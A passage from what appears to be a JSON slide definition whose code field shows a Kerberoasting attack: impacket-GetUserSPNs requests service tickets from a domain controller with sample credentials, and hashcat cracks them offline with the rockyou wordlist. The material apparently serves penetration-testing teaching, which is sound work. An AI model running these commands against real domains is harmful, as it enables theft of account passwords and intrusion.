      "bodyColor": "#7ab87a",
      "bodySize": 22,
      "bullets": [],
      "codeText": "# Dump SPNs for offline cracking\nimpacket-GetUserSPNs target.local/user:Password123 -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt\n\n# Crack\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt",
